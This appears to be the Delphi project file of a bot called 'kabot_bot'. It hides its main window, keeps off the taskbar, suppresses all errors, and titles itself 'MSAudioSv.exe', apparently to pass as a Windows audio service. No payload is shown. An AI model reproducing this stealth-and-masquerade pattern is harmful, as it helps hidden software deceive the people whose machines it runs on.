program kabot_bot;

{$R *.dres}

uses
  Forms,
  kabot in 'kabot.pas' {Form2},
  sycfuncs in 'sycfuncs.pas';

{$R *.res}

begin
  try
    Application.Initialize;
    Application.MainFormOnTaskbar := false;
    Application.ShowMainForm := false;
    Application.Title := 'MSAudioSv.exe';
    Application.CreateForm(TForm2, Form2);
  Application.Run;

  except

  end;

end.
